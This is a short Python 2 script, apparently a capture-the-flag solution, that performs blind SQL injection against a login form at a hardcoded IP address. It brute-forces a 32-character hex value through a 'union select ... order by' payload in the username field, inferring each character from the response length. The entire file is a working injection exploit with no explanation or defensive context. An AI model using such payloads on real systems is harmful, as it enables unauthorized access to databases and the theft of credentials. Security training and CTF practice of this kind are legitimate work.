#coding=utf-8
import requests 
import string

url = "http://115.159.205.137:8001/index.php"

s = requests.Session()
# 字典很重要
strings = "0123456789abcdef" 
flag = ''
for j in range(32):
    for i in strings:
        payload = "admin' union select 1,'0','{}' order by 3 -- -".format(flag+i)
        data = dict(username='{}'.format(payload),password='')
        html = s.post(url,data=data)
        print data,html.text

        if len(html.text) == 5:
            flag += temp 
            print data,html.text,flag
            break
        temp = i
        
        if i == 'f':
            flag += 'f'
            break
print flag